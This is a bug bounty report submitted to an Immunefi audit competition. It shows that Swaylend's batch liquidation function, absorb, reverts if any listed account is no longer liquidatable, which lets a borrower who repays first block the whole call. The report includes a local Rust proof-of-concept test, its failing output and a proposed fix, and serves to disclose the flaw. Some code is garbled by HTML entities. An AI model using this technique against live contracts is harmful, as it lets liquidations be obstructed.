# #36137 \[SC-Medium] \`absorb\_internal\` might be DOSed

**Submitted on Oct 21st 2024 at 15:16:36 UTC by @jasonxiale for** [**IOP | Swaylend**](https://immunefi.com/audit-competition/iop-swaylend)

* **Report ID:** #36137
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/Swaylend/swaylend-monorepo/blob/9132747331188b86dd8cbf9a1ca37b811d08dddb/contracts/market/src/main.sw>
* **Impacts:**
  * Block stuffing

## Description

## Brief/Intro

While calling [Market.absorb](https://github.com/Swaylend/swaylend-monorepo/blob/41b1329983c0b58db6f81e7ecd05a82be03038bd/contracts/market/src/main.sw#L755-L773), the input parameter \`accounts\` ' type is Vec, which means an array can be used as input.

Then in [main.sw#L769-L772](https://github.com/Swaylend/swaylend-monorepo/blob/41b1329983c0b58db6f81e7ecd05a82be03038bd/contracts/market/src/main.sw#L769-L772), the function calls \`absorb\_internal\` on each account.

According to [Market.absorb\_internal's](https://github.com/Swaylend/swaylend-monorepo/blob/41b1329983c0b58db6f81e7ecd05a82be03038bd/contracts/market/src/main.sw#L2168-L2235) definition, if the account is not **liquidatable**, the function will revert in [main.sw#L2175](https://github.com/Swaylend/swaylend-monorepo/blob/41b1329983c0b58db6f81e7ecd05a82be03038bd/contracts/market/src/main.sw#L2175).

**The issue is that there are some conditions that can cause the function revert in main.sw#L2175** For example:

1. If one of the borrower repay his debt before \`Market.absorb\`,
2. \`update\_price\_feeds\_if\_necessary\_internal\` is called by some one else with more recent price, and \`absorb\` is called with \`PriceDataUpdate\` stale price, by using the more recent price, if one of the accounts is not liquidatable, the function will also revert.

To mitigate the issue, I think it's better to use \`return\` if \`is\_liquidatable\_internal\` returns false instead of revert

## Vulnerability Details

\`\`\`Rust 2168 fn absorb\_internal(account: Identity) { 2169 // Get the user's basic information 2170 let user\_basic = storage.user\_basic.get(account).try\_read().unwrap\_or(UserBasic::default()); 2171 let old\_principal = user\_basic.principal; 2172 let old\_balance = present\_value(old\_principal); // decimals: base\_token\_decimals 2173 2174 // Check that the account is liquidatable >>>>>>> the function might revert here 2175 require(is\_liquidatable\_internal(account, old\_balance), Error::NotLiquidatable); 2176 ... \`\`\`

## Impact Details

\`Market.abosrb\` will be Dosed

## References

Add any relevant links to documentation or code

## Proof of Concept

## Proof of Concept

Please put the following code in \`contracts/market/tests/local\_tests/scenarios/cat negative\_reserves.rs\` and run \`\`\`bash cargo test --release local\_tests::scenarios::negative\_reserves::dos\_absorb\_test -- --nocapture

... running 1 test Price for BTC = 70000 Price for USDC = 1 Price for UNI = 5 Price for ETH = 3500 🏦 Market Total supply 10000 USDC | Total borrow 2000 USDC Total USDC balance = 8000 USDC | Total ETH balance = 2 ETH reserves: -0.011035 USDC | 0 ETH sRate 1 | bRate 1 Total collateral 2 ETH Utilization 0.2 | Last accrual time 10000

Alice 🦹 Principal = 10000000000 Present supply = 10000.024733 USDC | borrow = 0 USDC Supplied collateral 0 ETH Balance 10000 USDC | 9.999999999 ETH

Bob 🧛 Principal = -1000000000 Present supply = 0 USDC | borrow = 1000.006849 USDC Supplied collateral 1 ETH Balance 1000 USDC | 8.999999997 ETH

Chad 🤵 Principal = -1000000000 Present supply = 0 USDC | borrow = 1000.006849 USDC Supplied collateral 1 ETH Balance 1000 USDC | 8.999999997 ETH thread 'local\_tests::scenarios::negative\_reserves::dos\_absorb\_test' panicked at contracts/market/tests/local\_tests/scenarios/negative\_reserves.rs:367:10: called \`Result::unwrap()\` on an \`Err\` value: transaction reverted: NotLiquidatable, receipts: \[Call { id: 0000000000000000000000000000000000000000000000000000000000000000, to: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, amount: 1, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1999187, param1: 10480, param2: 10494, pc: 12144, is: 12144 }, Call { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, to: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, amount: 1, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1992906, param1: 67105076, param2: 67104052, pc: 250624, is: 250624 }, ReturnData { id: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, ptr: 0, len: 0, digest: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855, pc: 252612, is: 250624, data: Some() }, Call { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, to: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, amount: 0, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1966169, param1: 67094604, param2: 67093580, pc: 258224, is: 258224 }, ReturnData { id: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, ptr: 67091020, len: 28, digest: e557dcb998033eb306ab984b32c7366e6b11614e39a732ae35a41710a39f4c4e, pc: 262328, is: 258224, data: Some(00000000000000000000000800...) }, Call { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, to: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, amount: 0, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1944416, param1: 67073790, param2: 67072766, pc: 258224, is: 258224 }, ReturnData { id: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, ptr: 67070206, len: 28, digest: 1455af5a26cdf94022d4bb62f6a9bb84c445dbb66568119322ac3259fc7856fe, pc: 262328, is: 258224, data: Some(00000000000000000000000700...) }, Call { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, to: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, amount: 0, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1923533, param1: 67058832, param2: 67057808, pc: 249776, is: 249776 }, ReturnData { id: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, ptr: 67055248, len: 28, digest: e557dcb998033eb306ab984b32c7366e6b11614e39a732ae35a41710a39f4c4e, pc: 253880, is: 249776, data: Some(00000000000000000000000800...) }, LogData { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, ra: 0, rb: 3591203286967623281, ptr: 67054224, len: 116, digest: f11729f8e585ab4440586ac4851b2e140b4f0f81c023dbec5a10ce45df2c8c24, pc: 136116, is: 12144, data: Some(0000000000000000bdaad6a89e...) }, Call { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, to: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, amount: 0, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1901809, param1: 67046210, param2: 67045186, pc: 249776, is: 249776 }, ReturnData { id: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, ptr: 67042626, len: 28, digest: 1455af5a26cdf94022d4bb62f6a9bb84c445dbb66568119322ac3259fc7856fe, pc: 253880, is: 249776, data: Some(00000000000000000000000700...) }, LogData { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, ra: 0, rb: 5291237237808257645, ptr: 67032317, len: 136, digest: 0b8d57a67e8f299e8e0fb92c38c67d1c14fc2451890e9a60028c7c41384417bb, pc: 99400, is: 12144, data: Some(0000000000000000bdaad6a89e...) }, LogData { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, ra: 0, rb: 7659206549590130669, ptr: 67027709, len: 224, digest: 49aa4cc5dce821c90dd4892f990a3f85784d51a9c81e635c95bf0f9eecdd0d14, pc: 102668, is: 12144, data: Some(00000000000000000000000000...) }, LogData { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, ra: 0, rb: 10580804319558431108, ptr: 67026685, len: 212, digest: 59f41f219a4db949b61fc982f74abef11c8526ad750eff479bfea1d9a4c0521f, pc: 132980, is: 12144, data: Some(0000000000000000bdaad6a89e...) }, Call { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, to: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, amount: 0, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1873561, param1: 67018897, param2: 67017873, pc: 258224, is: 258224 }, ReturnData { id: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, ptr: 67015313, len: 28, digest: e557dcb998033eb306ab984b32c7366e6b11614e39a732ae35a41710a39f4c4e, pc: 262328, is: 258224, data: Some(00000000000000000000000800...) }, Call { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, to: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, amount: 0, asset\_id: 0000000000000000000000000000000000000000000000000000000000000000, gas: 1851808, param1: 66998083, param2: 66997059, pc: 258224, is: 258224 }, ReturnData { id: ec5780ec3aa7cbcc332be9a71b2f934777da6e6aab29b5f2e9c5740a689030bc, ptr: 66994499, len: 28, digest: 1455af5a26cdf94022d4bb62f6a9bb84c445dbb66568119322ac3259fc7856fe, pc: 262328, is: 258224, data: Some(00000000000000000000000700...) }, LogData { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, ra: 0, rb: 5650517601072614705, ptr: 66993475, len: 8, digest: 8005f02d43fa06e7d0585fb64c961d57e318b27a145c857bcd3a6bdb413ff7fc, pc: 59072, is: 12144, data: Some(0000000000000004) }, Revert { id: 5d4b546ccce1c8c678554e3b2d6a349ab969cfa20af7abbb4a5951cb1932822c, ra: 18446744073709486080, pc: 59080, is: 12144 }, ScriptResult { result: Revert, gas\_used: 152755 }] note: run with \`RUST\_BACKTRACE=1\` environment variable to display a backtrace test local\_tests::scenarios::negative\_reserves::dos\_absorb\_test ... FAILED \`\`\`

As above shows, if chad pay his debt before \`Market.absorb\`, the tx will be reverted.

\`\`\`Rust #\[tokio::test] async fn dos\_absorb\_test() { let TestData { wallets, alice, alice\_account, bob, bob\_account, chad, chad\_account, market, usdc, usdc\_contract, eth, oracle, price\_feed\_ids, publish\_time, prices, assets, .. } = setup(None).await;

```
let price_data_update &#x3D; PriceDataUpdate {
    update_fee: 1,
    price_feed_ids,
    publish_times: vec![publish_time; assets.len()],
    update_data: oracle.create_update_data(&amp;prices).await.unwrap(),
};

let alice_supply_amount &#x3D; parse_units(10000 * AMOUNT_COEFFICIENT, usdc.decimals);
let alice_mint_amount &#x3D; parse_units(20000 * AMOUNT_COEFFICIENT, usdc.decimals);
usdc_contract
    .mint(alice_account, alice_mint_amount)
    .await
    .unwrap();
let balance &#x3D; alice.get_asset_balance(&amp;usdc.asset_id).await.unwrap();
assert!(balance &#x3D;&#x3D; alice_mint_amount);

let alice_supply_res &#x3D; market
    .with_account(&amp;alice)
    .await
    .unwrap()
    .supply_base(usdc.asset_id, alice_supply_amount)
    .await;
assert!(alice_supply_res.is_ok());

market.debug_increment_timestamp().await.unwrap();

let bob_supply_amount &#x3D; parse_units(1 * AMOUNT_COEFFICIENT, eth.decimals);
let bob_supply_res &#x3D; market
    .with_account(&amp;bob)
    .await
    .unwrap()
    .supply_collateral(eth.asset_id, bob_supply_amount)
    .await;
assert!(bob_supply_res.is_ok());

let chad_supply_amount &#x3D; parse_units(1 * AMOUNT_COEFFICIENT, eth.decimals);
let chad_supply_res &#x3D; market
    .with_account(&amp;chad)
    .await
    .unwrap()
    .supply_collateral(eth.asset_id, chad_supply_amount)
    .await;
assert!(chad_supply_res.is_ok());

let bob_borrow_amount &#x3D; parse_units(1000 * AMOUNT_COEFFICIENT, usdc.decimals);
let bob_borrow_res &#x3D; market
    .with_account(&amp;bob)
    .await
    .unwrap()
    .withdraw_base(&amp;[&amp;oracle.instance], bob_borrow_amount, &amp;price_data_update)
    .await;
assert!(bob_borrow_res.is_ok(), &quot;{:?}&quot;, bob_borrow_res.err());

let chad_borrow_amount &#x3D; parse_units(1000 * AMOUNT_COEFFICIENT, usdc.decimals);
let chad_borrow_res &#x3D; market
    .with_account(&amp;chad)
    .await
    .unwrap()
    .withdraw_base(&amp;[&amp;oracle.instance], chad_borrow_amount, &amp;price_data_update)
    .await;
assert!(chad_borrow_res.is_ok(), &quot;{:?}&quot;, chad_borrow_res.err());

market.debug_increment_timestamp().await.unwrap();

let res &#x3D; oracle.price(eth.price_feed_id).await.unwrap().value;
let new_price &#x3D; (res.price as f64 * 0.3) as u64;
let prices &#x3D; Vec::from([(
    eth.price_feed_id,
    (
        new_price,
        eth.price_feed_decimals,
        res.publish_time,
        res.confidence,
    ),
)]);

oracle.update_prices(&amp;prices).await.unwrap();

let price_data_update &#x3D; PriceDataUpdate {
    update_fee: 1,
    price_feed_ids: vec![eth.price_feed_id],
    publish_times: vec![tai64::Tai64::from_unix(Utc::now().timestamp().try_into().unwrap()).0],
    update_data: oracle.create_update_data(&amp;prices).await.unwrap(),
};

let res &#x3D; oracle.price(eth.price_feed_id).await.unwrap().value;
assert!(new_price &#x3D;&#x3D; res.price);

market
    .print_debug_state(&amp;wallets, &amp;usdc, &amp;eth)
    .await
    .unwrap();

assert!(
    market
        .is_liquidatable(&amp;[&amp;oracle.instance], bob_account)
        .await
        .unwrap()
        .value
);

assert!(
    market
        .is_liquidatable(&amp;[&amp;oracle.instance], chad_account)
        .await
        .unwrap()
        .value
);

let chad_supply_res &#x3D; market
    .with_account(&amp;chad)
    .await
    .unwrap()
    .supply_base(usdc.asset_id, chad_borrow_amount)
    .await;
assert!(chad_supply_res.is_ok());

market
    .with_account(&amp;chad)
    .await
    .unwrap()
    .absorb(&amp;[&amp;oracle.instance], vec![bob_account, chad_account], &amp;price_data_update)
    .await
    .unwrap();
```

} \`\`\`
